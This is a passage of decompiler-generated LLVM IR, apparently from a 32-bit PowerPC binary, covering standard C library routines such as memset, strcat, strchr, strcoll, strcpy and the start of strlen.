dec_label_pc_1000dd30:                            ; preds = %dec_label_pc_1000dd30.dec_label_pc_1000dd30_crit_edge, %dec_label_pc_1000dd24
  %v2_1000dd38 = phi i32 [ %v1_1000dd3c, %dec_label_pc_1000dd30.dec_label_pc_1000dd30_crit_edge ], [ %v1_1000dcc0, %dec_label_pc_1000dd24 ]
  %v0_1000dd30 = phi i32 [ %v0_1000dd30.pre, %dec_label_pc_1000dd30.dec_label_pc_1000dd30_crit_edge ], [ %v1_1000dcbc, %dec_label_pc_1000dd24 ]
  %v1_1000dd30 = add i32 %v0_1000dd30, 4
  %v2_1000dd30 = inttoptr i32 %v1_1000dd30 to i8*
  %v3_1000dd30 = load i8, i8* %v2_1000dd30, align 1
  %v1_1000dd34 = add i32 %v0_1000dd30, 1
  store i32 %v1_1000dd34, i32* %r4.global-to-local, align 4
  %v3_1000dd38 = add i32 %v2_1000dd38, 4
  %v4_1000dd38 = inttoptr i32 %v3_1000dd38 to i8*
  store i8 %v3_1000dd30, i8* %v4_1000dd38, align 1
  %v0_1000dd3c = load i32, i32* @r11, align 4
  %v1_1000dd3c = add i32 %v0_1000dd3c, 1
  store i32 %v1_1000dd3c, i32* @r11, align 4
  %v0_1000dd40 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dd40 = add i32 %v0_1000dd40, -1
  store i32 %v1_1000dd40, i32* %ctr.global-to-local, align 4
  %v2_1000dd40 = icmp eq i32 %v1_1000dd40, 0
  br i1 %v2_1000dd40, label %dec_label_pc_1000dd44, label %dec_label_pc_1000dd30.dec_label_pc_1000dd30_crit_edge

dec_label_pc_1000dd30.dec_label_pc_1000dd30_crit_edge: ; preds = %dec_label_pc_1000dd30
  %v0_1000dd30.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000dd30

dec_label_pc_1000dd44:                            ; preds = %dec_label_pc_1000dd30
  %v1_1000dd44 = call i32 @__asm_rlwinm.(i32 %v2_1000dd2c, i32 29, i32 3, i32 31)
  store i32 %v1_1000dd44, i32* %r9.global-to-local, align 4
  %v4_1000dd44 = icmp eq i32 %v1_1000dd44, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000dd44, label %dec_label_pc_1000dce8, label %dec_label_pc_1000dd44.dec_label_pc_1000dcd0_crit_edge

dec_label_pc_1000dd44.dec_label_pc_1000dcd0_crit_edge: ; preds = %dec_label_pc_1000dd44
  %v1_1000dcdc.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000dcd0

dec_label_pc_1000dd50:                            ; preds = %dec_label_pc_1000dd14.dec_label_pc_1000dd14_crit_edge, %dec_label_pc_1000dd00
  %v0_1000dd50 = load i32, i32* @r3, align 4
  ret i32 %v0_1000dd50

; uselistorder directives
  uselistorder i32 %v1_1000dd44, { 1, 2, 0 }
  uselistorder i32 %v1_1000dd40, { 1, 0 }
  uselistorder i32 %v1_1000dd3c, { 1, 0 }
  uselistorder i32 %v0_1000dd30, { 1, 0 }
  uselistorder i32 %v2_1000dd2c, { 2, 1, 0 }
  uselistorder i32 %v1_1000dd1c, { 1, 0 }
  uselistorder i32 %v3_1000dd18, { 1, 2, 0 }
  uselistorder i32 %v1_1000dce8, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000dce4, { 1, 0 }
  uselistorder i32 %v2_1000dce0, { 1, 2, 0 }
  uselistorder i32 %v1_1000dcc8, { 1, 0 }
  uselistorder i32 %v1_1000dcc0, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000dd14.dec_label_pc_1000dd14_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000dd00, { 1, 0 }
  uselistorder label %dec_label_pc_1000dce8, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000dd54 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_1000dd54, i32* %r9.global-to-local, align 4
  %v4_1000dd54 = icmp eq i32 %v1_1000dd54, 0
  store i1 %v4_1000dd54, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  %v1_1000dd5c = add i32 %arg1, -4
  store i32 %v1_1000dd5c, i32* %r11.global-to-local, align 4
  %v1_1000dd60 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_1000dd64 = call i32 @__asm_rlwimi(i32 %v1_1000dd60, i32 16, i32 0, i32 15)
  %v2_1000dd64 = trunc i32 %v1_1000dd64 to i8
  %v0_1000dd68 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000dd68, label %dec_label_pc_1000dd8c, label %dec_label_pc_1000dd6c

dec_label_pc_1000dd6c:                            ; preds = %entry
  %v0_1000dd6c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000dd6c = urem i32 %v0_1000dd6c, 4
  %v3_1000dd6c = icmp eq i32 %v1_1000dd6c, 0
  store i1 %v3_1000dd6c, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000dd6c, label %dec_label_pc_1000dd6c.dec_label_pc_1000dd74_crit_edge, label %dec_label_pc_1000ddbc

dec_label_pc_1000dd6c.dec_label_pc_1000dd74_crit_edge: ; preds = %dec_label_pc_1000dd6c
  %v0_1000dd74.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000dd74

dec_label_pc_1000dd74:                            ; preds = %dec_label_pc_1000ddd4.dec_label_pc_1000dd74_crit_edge, %dec_label_pc_1000dd6c.dec_label_pc_1000dd74_crit_edge
  %v0_1000dd78.pre = phi i32 [ %v0_1000dd6c, %dec_label_pc_1000dd6c.dec_label_pc_1000dd74_crit_edge ], [ %v0_1000dd78.pre.pre, %dec_label_pc_1000ddd4.dec_label_pc_1000dd74_crit_edge ]
  %v0_1000dd74 = phi i32 [ %v0_1000dd74.pre, %dec_label_pc_1000dd6c.dec_label_pc_1000dd74_crit_edge ], [ %v1_1000ddd4, %dec_label_pc_1000ddd4.dec_label_pc_1000dd74_crit_edge ]
  store i32 %v0_1000dd74, i32* %ctr.global-to-local, align 4
  %v1_1000dd7c = sext i8 %v2_1000dd64 to i32
  br label %dec_label_pc_1000dd78

dec_label_pc_1000dd78:                            ; preds = %dec_label_pc_1000dd78, %dec_label_pc_1000dd74
  %v0_1000dd78 = phi i32 [ %v1_1000dd84, %dec_label_pc_1000dd78 ], [ %v0_1000dd78.pre, %dec_label_pc_1000dd74 ]
  %v1_1000dd78 = add i32 %v0_1000dd78, 4
  store i32 %v1_1000dd78, i32* %r9.global-to-local, align 4
  %v4_1000dd7c = inttoptr i32 %v1_1000dd78 to i32*
  store i32 %v1_1000dd7c, i32* %v4_1000dd7c, align 4
  %v2_1000dd80 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000dd80 = add i32 %v2_1000dd80, 4
  %v4_1000dd80 = inttoptr i32 %v3_1000dd80 to i32*
  store i32 %v1_1000dd7c, i32* %v4_1000dd80, align 4
  %v0_1000dd84 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000dd84 = add i32 %v0_1000dd84, 4
  store i32 %v1_1000dd84, i32* %r11.global-to-local, align 4
  %v0_1000dd88 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dd88 = add i32 %v0_1000dd88, -1
  store i32 %v1_1000dd88, i32* %ctr.global-to-local, align 4
  %v2_1000dd88 = icmp eq i32 %v1_1000dd88, 0
  br i1 %v2_1000dd88, label %dec_label_pc_1000dd8c, label %dec_label_pc_1000dd78

dec_label_pc_1000dd8c:                            ; preds = %dec_label_pc_1000dd78, %dec_label_pc_1000ddd4, %entry
  %v0_1000dd8c = load i32, i32* %r5.global-to-local, align 4
  %v1_1000dd8c = urem i32 %v0_1000dd8c, 8
  store i32 %v1_1000dd8c, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000dd8c, 4
  br i1 %tmp, label %dec_label_pc_1000dda0, label %dec_label_pc_1000dd98

dec_label_pc_1000dd98:                            ; preds = %dec_label_pc_1000dd8c
  %v1_1000dd98 = sext i8 %v2_1000dd64 to i32
  %v2_1000dd98 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000dd98 = add i32 %v2_1000dd98, 4
  %v4_1000dd98 = inttoptr i32 %v3_1000dd98 to i32*
  store i32 %v1_1000dd98, i32* %v4_1000dd98, align 4
  store i32 %v3_1000dd98, i32* %r11.global-to-local, align 4
  %v0_1000dd9c = load i32, i32* @r5, align 4
  %v1_1000dd9c = add i32 %v0_1000dd9c, -4
  store i32 %v1_1000dd9c, i32* @r5, align 4
  br label %dec_label_pc_1000dda0

dec_label_pc_1000dda0:                            ; preds = %dec_label_pc_1000dd8c, %dec_label_pc_1000dd98
  %v0_1000dda0 = phi i32 [ %v1_1000dd8c, %dec_label_pc_1000dd8c ], [ %v1_1000dd9c, %dec_label_pc_1000dd98 ]
  %v3_1000dda0 = icmp eq i32 %v0_1000dda0, 0
  %v0_1000dda4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000dda0, i32 %v0_1000dda4)
  %v0_1000dda8 = load i32, i32* @r5, align 4
  store i32 %v0_1000dda8, i32* %ctr.global-to-local, align 4
  %v0_1000ddac = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ddac = add i32 %v0_1000ddac, 3
  store i32 %v1_1000ddac, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ddb0

dec_label_pc_1000ddb0:                            ; preds = %dec_label_pc_1000ddb0, %dec_label_pc_1000dda0
  %v3_1000ddb0 = phi i32 [ %v4_1000ddb0, %dec_label_pc_1000ddb0 ], [ %v1_1000ddac, %dec_label_pc_1000dda0 ]
  %v4_1000ddb0 = add i32 %v3_1000ddb0, 1
  %v5_1000ddb0 = inttoptr i32 %v4_1000ddb0 to i8*
  store i8 %v2_1000dd64, i8* %v5_1000ddb0, align 1
  store i32 %v4_1000ddb0, i32* %r9.global-to-local, align 4
  %v0_1000ddb4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ddb4 = add i32 %v0_1000ddb4, -1
  store i32 %v1_1000ddb4, i32* %ctr.global-to-local, align 4
  %v2_1000ddb4 = icmp eq i32 %v1_1000ddb4, 0
  br i1 %v2_1000ddb4, label %dec_label_pc_1000dde0, label %dec_label_pc_1000ddb0

dec_label_pc_1000ddbc:                            ; preds = %dec_label_pc_1000dd6c
  %v1_1000ddbc = sub nsw i32 4, %v1_1000dd6c
  store i32 %v1_1000ddbc, i32* %ctr.global-to-local, align 4
  %v1_1000ddc4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000ddc4 = sub i32 %v1_1000ddc4, %v1_1000ddbc
  store i32 %v2_1000ddc4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ddc8

dec_label_pc_1000ddc8:                            ; preds = %dec_label_pc_1000ddc8, %dec_label_pc_1000ddbc
  %v3_1000ddc8 = phi i32 [ %v1_1000ddcc, %dec_label_pc_1000ddc8 ], [ %v0_1000dd6c, %dec_label_pc_1000ddbc ]
  %v4_1000ddc8 = add i32 %v3_1000ddc8, 4
  %v5_1000ddc8 = inttoptr i32 %v4_1000ddc8 to i8*
  store i8 %v2_1000dd64, i8* %v5_1000ddc8, align 1
  %v0_1000ddcc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ddcc = add i32 %v0_1000ddcc, 1
  store i32 %v1_1000ddcc, i32* %r11.global-to-local, align 4
  %v0_1000ddd0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ddd0 = add i32 %v0_1000ddd0, -1
  store i32 %v1_1000ddd0, i32* %ctr.global-to-local, align 4
  %v2_1000ddd0 = icmp eq i32 %v1_1000ddd0, 0
  br i1 %v2_1000ddd0, label %dec_label_pc_1000ddd4, label %dec_label_pc_1000ddc8

dec_label_pc_1000ddd4:                            ; preds = %dec_label_pc_1000ddc8
  %v0_1000ddd4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ddd4 = call i32 @__asm_rlwinm.(i32 %v0_1000ddd4, i32 29, i32 3, i32 31)
  store i32 %v1_1000ddd4, i32* %r9.global-to-local, align 4
  %v4_1000ddd4 = icmp eq i32 %v1_1000ddd4, 0
  store i1 %v4_1000ddd4, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000ddd4, label %dec_label_pc_1000dd8c, label %dec_label_pc_1000ddd4.dec_label_pc_1000dd74_crit_edge

dec_label_pc_1000ddd4.dec_label_pc_1000dd74_crit_edge: ; preds = %dec_label_pc_1000ddd4
  %v0_1000dd78.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000dd74

dec_label_pc_1000dde0:                            ; preds = %dec_label_pc_1000ddb0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000ddd4, { 1, 2, 0 }
  uselistorder i32 %v1_1000ddd0, { 1, 0 }
  uselistorder i32 %v1_1000ddcc, { 1, 0 }
  uselistorder i32 %v1_1000ddb4, { 1, 0 }
  uselistorder i32 %v4_1000ddb0, { 1, 2, 0 }
  uselistorder i32 %v1_1000dd8c, { 2, 1, 0 }
  uselistorder i32 %v1_1000dd88, { 1, 0 }
  uselistorder i32 %v1_1000dd84, { 1, 0 }
  uselistorder i32 %v1_1000dd6c, { 1, 0 }
  uselistorder i32 %v0_1000dd6c, { 2, 1, 0 }
  uselistorder i8 %v2_1000dd64, { 1, 2, 3, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000dda0, { 1, 0 }
  uselistorder label %dec_label_pc_1000dd8c, { 1, 0, 2 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_1000dde8

dec_label_pc_1000dde8:                            ; preds = %dec_label_pc_1000dde8, %entry
  %v0_1000dde8 = phi i32 [ %v1_1000ddec, %dec_label_pc_1000dde8 ], [ %tmp, %entry ]
  %v1_1000dde8 = inttoptr i32 %v0_1000dde8 to i8*
  %v2_1000dde8 = load i8, i8* %v1_1000dde8, align 1
  %v1_1000ddec = add i32 %v0_1000dde8, 1
  %v3_1000ddf0 = icmp eq i8 %v2_1000dde8, 0
  store i1 %v3_1000ddf0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000ddf0, label %dec_label_pc_1000ddf8, label %dec_label_pc_1000dde8

dec_label_pc_1000ddf8:                            ; preds = %dec_label_pc_1000dde8
  %v1_1000ddf8 = add i32 %v0_1000dde8, -1
  br label %dec_label_pc_1000ddfc

dec_label_pc_1000ddfc:                            ; preds = %dec_label_pc_1000ddfc, %dec_label_pc_1000ddf8
  %v2_1000de08 = phi i32 [ %v3_1000de08, %dec_label_pc_1000ddfc ], [ %v1_1000ddf8, %dec_label_pc_1000ddf8 ]
  %v0_1000ddfc = load i32, i32* @r4, align 4
  %v1_1000ddfc = inttoptr i32 %v0_1000ddfc to i8*
  %v2_1000ddfc = load i8, i8* %v1_1000ddfc, align 1
  %v1_1000de00 = add i32 %v0_1000ddfc, 1
  store i32 %v1_1000de00, i32* @r4, align 4
  %v3_1000de04 = icmp eq i8 %v2_1000ddfc, 0
  store i1 %v3_1000de04, i1* %cr7_eq.global-to-local, align 1
  %v3_1000de08 = add i32 %v2_1000de08, 1
  %v4_1000de08 = inttoptr i32 %v3_1000de08 to i8*
  store i8 %v2_1000ddfc, i8* %v4_1000de08, align 1
  %v0_1000de0c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000de0c, label %dec_label_pc_1000de10, label %dec_label_pc_1000ddfc

dec_label_pc_1000de10:                            ; preds = %dec_label_pc_1000ddfc
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_1000de08, { 1, 0 }
  uselistorder i32 %v0_1000dde8, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000de14 = urem i32 %arg1, 256
  store i32 %v1_1000de14, i32* %r4.global-to-local, align 4
  %v0_1000de342 = load i32, i32* @r3, align 4
  %v1_1000de343 = urem i32 %v0_1000de342, 4
  %v3_1000de345 = icmp eq i32 %v1_1000de343, 0
  br i1 %v3_1000de345, label %dec_label_pc_1000de3c, label %dec_label_pc_1000de1c

dec_label_pc_1000de1c:                            ; preds = %entry, %dec_label_pc_1000de30
  %v1_1000de20 = phi i32 [ %v0_1000de3c.pre, %dec_label_pc_1000de30 ], [ %v1_1000de14, %entry ]
  %v0_1000de1c = phi i32 [ %v1_1000de30, %dec_label_pc_1000de30 ], [ %v0_1000de342, %entry ]
  %v1_1000de1c = inttoptr i32 %v0_1000de1c to i8*
  %v2_1000de1c = load i8, i8* %v1_1000de1c, align 1
  %v3_1000de1c = zext i8 %v2_1000de1c to i32
  %v4_1000de20 = icmp eq i32 %v3_1000de1c, %v1_1000de20
  %v3_1000de24 = icmp eq i8 %v2_1000de1c, 0
  %v0_1000de28 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000de20, i32 %v0_1000de28)
  br i1 %v3_1000de24, label %dec_label_pc_1000df0c, label %dec_label_pc_1000de30

dec_label_pc_1000de30:                            ; preds = %dec_label_pc_1000de1c
  %v0_1000de30 = load i32, i32* @r3, align 4
  %v1_1000de30 = add i32 %v0_1000de30, 1
  store i32 %v1_1000de30, i32* @r3, align 4
  %v1_1000de34 = urem i32 %v1_1000de30, 4
  %v3_1000de34 = icmp eq i32 %v1_1000de34, 0
  %v0_1000de3c.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000de34, label %dec_label_pc_1000de3c, label %dec_label_pc_1000de1c

dec_label_pc_1000de3c:                            ; preds = %dec_label_pc_1000de30, %entry
  %v0_1000de5410 = phi i32 [ %v0_1000de342, %entry ], [ %v1_1000de30, %dec_label_pc_1000de30 ]
  %v0_1000de3c = phi i32 [ %v1_1000de14, %entry ], [ %v0_1000de3c.pre, %dec_label_pc_1000de30 ]
  %v1_1000de3c = mul i32 %v0_1000de3c, 256
  %v2_1000de44 = or i32 %v1_1000de3c, %v0_1000de3c
  %v1_1000de4c = mul i32 %v2_1000de44, 65536
  %v2_1000de50 = or i32 %v1_1000de4c, %v2_1000de44
  br label %dec_label_pc_1000de54

dec_label_pc_1000de54:                            ; preds = %dec_label_pc_1000de54, %dec_label_pc_1000df08, %dec_label_pc_1000de3c
  %v0_1000deac = phi i32 [ %v0_1000de5410, %dec_label_pc_1000de3c ], [ %v1_1000de58, %dec_label_pc_1000df08 ], [ %v1_1000de58, %dec_label_pc_1000de54 ]
  %v1_1000de54 = inttoptr i32 %v0_1000deac to i32*
  %v2_1000de54 = load i32, i32* %v1_1000de54, align 4
  %v1_1000de58 = add i32 %v0_1000deac, 4
  %v2_1000de60 = xor i32 %v2_1000de54, %v2_1000de50
  %v1_1000de64 = add i32 %v2_1000de54, 2130640639
  %v2_1000de6c = xor i32 %v1_1000de64, %v2_1000de54
  %v1_1000de70 = add i32 %v2_1000de60, 2130640639
  %v2_1000de74 = and i32 %v2_1000de6c, -2130640640
  %v3_1000de74 = xor i32 %v2_1000de74, -2130640640
  %v2_1000de78 = xor i32 %v1_1000de70, %v2_1000de60
  %v2_1000de7c = and i32 %v2_1000de78, -2130640640
  %v3_1000de7c = xor i32 %v2_1000de7c, -2130640640
  %v1_1000de88 = add i32 %v0_1000deac, 1
  %tmp = or i32 %v3_1000de7c, %v3_1000de74
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_1000de54, label %dec_label_pc_1000de94

dec_label_pc_1000de94:                            ; preds = %dec_label_pc_1000de54
  %v2_1000de94 = inttoptr i32 %v0_1000deac to i8*
  %v3_1000de94 = load i8, i8* %v2_1000de94, align 1
  %v4_1000de94 = zext i8 %v3_1000de94 to i32
  %v1_1000de98 = add i32 %v0_1000deac, 2
  %v1_1000de9c = add i32 %v0_1000deac, 3
  %v4_1000dea0 = icmp eq i32 %v4_1000de94, %v0_1000de3c
  br i1 %v4_1000dea0, label %dec_label_pc_1000deac, label %dec_label_pc_1000deb4

dec_label_pc_1000deac:                            ; preds = %dec_label_pc_1000de94
  ret i32 %v0_1000deac

dec_label_pc_1000deb4:                            ; preds = %dec_label_pc_1000de94
  %v3_1000dea4 = icmp eq i8 %v3_1000de94, 0
  br i1 %v3_1000dea4, label %dec_label_pc_1000df0c, label %dec_label_pc_1000deb8

dec_label_pc_1000deb8:                            ; preds = %dec_label_pc_1000deb4
  %v2_1000deb8 = inttoptr i32 %v1_1000de88 to i8*
  %v3_1000deb8 = load i8, i8* %v2_1000deb8, align 1
  %v4_1000deb8 = zext i8 %v3_1000deb8 to i32
  %v4_1000debc = icmp eq i32 %v4_1000deb8, %v0_1000de3c
  br i1 %v4_1000debc, label %dec_label_pc_1000dec8, label %dec_label_pc_1000ded0

dec_label_pc_1000dec8:                            ; preds = %dec_label_pc_1000deb8
  ret i32 %v1_1000de88

dec_label_pc_1000ded0:                            ; preds = %dec_label_pc_1000deb8
  %v3_1000dec0 = icmp eq i8 %v3_1000deb8, 0
  br i1 %v3_1000dec0, label %dec_label_pc_1000df0c, label %dec_label_pc_1000ded4

dec_label_pc_1000ded4:                            ; preds = %dec_label_pc_1000ded0
  %v2_1000ded4 = inttoptr i32 %v1_1000de98 to i8*
  %v3_1000ded4 = load i8, i8* %v2_1000ded4, align 1
  %v4_1000ded4 = zext i8 %v3_1000ded4 to i32
  %v4_1000ded8 = icmp eq i32 %v4_1000ded4, %v0_1000de3c
  br i1 %v4_1000ded8, label %dec_label_pc_1000dee4, label %dec_label_pc_1000deec

dec_label_pc_1000dee4:                            ; preds = %dec_label_pc_1000ded4
  ret i32 %v1_1000de98

dec_label_pc_1000deec:                            ; preds = %dec_label_pc_1000ded4
  %v3_1000dedc = icmp eq i8 %v3_1000ded4, 0
  br i1 %v3_1000dedc, label %dec_label_pc_1000df0c, label %dec_label_pc_1000def0

dec_label_pc_1000def0:                            ; preds = %dec_label_pc_1000deec
  %v2_1000def0 = inttoptr i32 %v1_1000de9c to i8*
  %v3_1000def0 = load i8, i8* %v2_1000def0, align 1
  %v4_1000def0 = zext i8 %v3_1000def0 to i32
  %v4_1000def4 = icmp eq i32 %v4_1000def0, %v0_1000de3c
  br i1 %v4_1000def4, label %dec_label_pc_1000df00, label %dec_label_pc_1000df08

dec_label_pc_1000df00:                            ; preds = %dec_label_pc_1000def0
  ret i32 %v1_1000de9c

dec_label_pc_1000df08:                            ; preds = %dec_label_pc_1000def0
  %v3_1000def8 = icmp eq i8 %v3_1000def0, 0
  br i1 %v3_1000def8, label %dec_label_pc_1000df0c, label %dec_label_pc_1000de54

dec_label_pc_1000df0c:                            ; preds = %dec_label_pc_1000de1c, %dec_label_pc_1000df08, %dec_label_pc_1000deec, %dec_label_pc_1000ded0, %dec_label_pc_1000deb4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000de58, { 1, 0 }
  uselistorder i32 %v2_1000de54, { 0, 2, 1 }
  uselistorder i32 %v0_1000deac, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1000de44, { 1, 0 }
  uselistorder i32 %v0_1000de3c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000de30, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000de342, { 2, 1, 0 }
  uselistorder i32 %v1_1000de14, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000df0c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000de54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000de1c, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000df20.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000df18

dec_label_pc_1000df18:                            ; preds = %dec_label_pc_1000df3c, %entry
  %v0_1000df20 = phi i32 [ %v1_1000df24, %dec_label_pc_1000df3c ], [ %v0_1000df20.pre, %entry ]
  %v0_1000df18 = phi i32 [ %v1_1000df1c, %dec_label_pc_1000df3c ], [ %tmp, %entry ]
  %v1_1000df18 = inttoptr i32 %v0_1000df18 to i8*
  %v2_1000df18 = load i8, i8* %v1_1000df18, align 1
  %v3_1000df18 = zext i8 %v2_1000df18 to i32
  %v1_1000df20 = inttoptr i32 %v0_1000df20 to i8*
  %v2_1000df20 = load i8, i8* %v1_1000df20, align 1
  %v3_1000df20 = zext i8 %v2_1000df20 to i32
  %v3_1000df28 = icmp eq i8 %v2_1000df18, 0
  br i1 %v3_1000df28, label %dec_label_pc_1000df34, label %dec_label_pc_1000df3c

dec_label_pc_1000df34:                            ; preds = %dec_label_pc_1000df18
  %v1_1000df34 = sub nsw i32 0, %v3_1000df20
  ret i32 %v1_1000df34

dec_label_pc_1000df3c:                            ; preds = %dec_label_pc_1000df18
  %v4_1000df2c = icmp eq i8 %v2_1000df18, %v2_1000df20
  %v1_1000df24 = add i32 %v0_1000df20, 1
  %v1_1000df1c = add i32 %v0_1000df18, 1
  br i1 %v4_1000df2c, label %dec_label_pc_1000df18, label %dec_label_pc_1000df40

dec_label_pc_1000df40:                            ; preds = %dec_label_pc_1000df3c
  %v2_1000df40 = sub nsw i32 %v3_1000df18, %v3_1000df20
  ret i32 %v2_1000df40

; uselistorder directives
  uselistorder i32 %v3_1000df20, { 1, 0 }
  uselistorder i32 %v0_1000df18, { 1, 0 }
  uselistorder i32 %v0_1000df20, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1000df48 = add i32 %arg1, -1
  %v1_1000df4c = sub i32 %v2_1000df48, %tmp
  store i32 %v1_1000df4c, i32* %r9.global-to-local, align 4
  %v2_1000df504 = load i8, i8* %arg2, align 1
  %v1_1000df546 = add i32 %tmp, 1
  store i32 %v1_1000df546, i32* %r4.global-to-local, align 4
  %v3_1000df588 = icmp eq i8 %v2_1000df504, 0
  store i1 %v3_1000df588, i1* %cr7_eq.global-to-local, align 1
  %v5_1000df5c9 = inttoptr i32 %arg1 to i8*
  store i8 %v2_1000df504, i8* %v5_1000df5c9, align 1
  %v0_1000df6010 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000df6010, label %dec_label_pc_1000df64, label %dec_label_pc_1000df50.dec_label_pc_1000df50_crit_edge

dec_label_pc_1000df50.dec_label_pc_1000df50_crit_edge: ; preds = %entry, %dec_label_pc_1000df50.dec_label_pc_1000df50_crit_edge
  %v0_1000df50.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1000df5c.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000df50 = inttoptr i32 %v0_1000df50.pre to i8*
  %v2_1000df50 = load i8, i8* %v1_1000df50, align 1
  %v1_1000df54 = add i32 %v0_1000df50.pre, 1
  store i32 %v1_1000df54, i32* %r4.global-to-local, align 4
  %v3_1000df58 = icmp eq i8 %v2_1000df50, 0
  store i1 %v3_1000df58, i1* %cr7_eq.global-to-local, align 1
  %v4_1000df5c = add i32 %v1_1000df54, %v2_1000df5c.pre
  %v5_1000df5c = inttoptr i32 %v4_1000df5c to i8*
  store i8 %v2_1000df50, i8* %v5_1000df5c, align 1
  %v0_1000df60 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000df60, label %dec_label_pc_1000df64, label %dec_label_pc_1000df50.dec_label_pc_1000df50_crit_edge

dec_label_pc_1000df64:                            ; preds = %dec_label_pc_1000df50.dec_label_pc_1000df50_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000df50.dec_label_pc_1000df50_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_1000df68 = load i32, i32* @r3, align 4
  %v1_1000df803 = urem i32 %v0_1000df68, 4
  %v3_1000df805 = icmp eq i32 %v1_1000df803, 0
  br i1 %v3_1000df805, label %dec_label_pc_1000df88, label %dec_label_pc_1000df70

dec_label_pc_1000df70:                            ; preds = %entry, %dec_label_pc_1000df7c
